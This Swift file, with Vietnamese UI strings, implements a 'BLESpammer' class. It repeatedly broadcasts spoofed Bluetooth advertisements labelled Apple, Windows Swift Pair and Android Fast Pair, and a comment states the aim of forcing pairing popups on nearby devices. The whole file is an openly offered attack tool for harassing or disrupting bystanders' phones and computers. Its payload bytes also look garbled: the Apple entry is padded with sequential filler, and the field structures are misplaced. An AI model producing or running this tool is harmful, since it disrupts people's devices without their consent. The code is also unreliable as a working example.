import Foundation
import CoreBluetooth

final class BLESpammer: NSObject, ObservableObject, CBPeripheralManagerDelegate {
    private var manager: CBPeripheralManager!
    private var timer: Timer?
    private var counter = 0

    @Published var status: String = "Chờ kết nối..."

    // Payload mới nhất (2024) — Apple, Windows, Android
    private let payloads: [(type: String, data: [UInt8])] = [
        // Apple Device (AirPods, Apple Pencil) - Gây popup kết nối
        ("Apple", [0x1E, 0xFF, 0x4C, 0x00, 0x07, 0x19, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0x3E, 0x3F]),
        // Windows Swift Pair
        ("Win", [0x06, 0x03, 0x03, 0x0F, 0x18]),
        // Android Fast Pair
        ("Android", [0x03, 0x03, 0x2C, 0xFE, 0x17, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00])
    ]

    func start() {
        manager = CBPeripheralManager(delegate: self, queue: nil)
    }

    func stop() {
        timer?.invalidate()
        timer = nil
        manager?.stopAdvertising()
        status = "Đã dừng"
    }

    func peripheralManagerDidUpdateState(_ peripheral: CBPeripheralManager) {
        switch peripheral.state {
        case .poweredOn:
            status = "Đang phát sóng..."
            timer = Timer.scheduledTimer(withTimeInterval: 0.2, repeats: true) { [weak self] _ in
                self?.fire()
            }
        case .unauthorized:
            status = "Lỗi: Chưa cấp quyền Bluetooth!"
        case .poweredOff:
            status = "Lỗi: Bluetooth đang tắt!"
        default:
            status = "Lỗi trạng thái: \(peripheral.state.rawValue)"
        }
    }

    private func fire() {
        let p = payloads[counter % payloads.count]
        counter += 1
        let data = Data(p.data)
        manager.stopAdvertising()
        manager.startAdvertising([
            CBAdvertisementDataLocalNameKey: p.type,
            CBAdvertisementDataManufacturerDataKey: data
        ])
    }
}
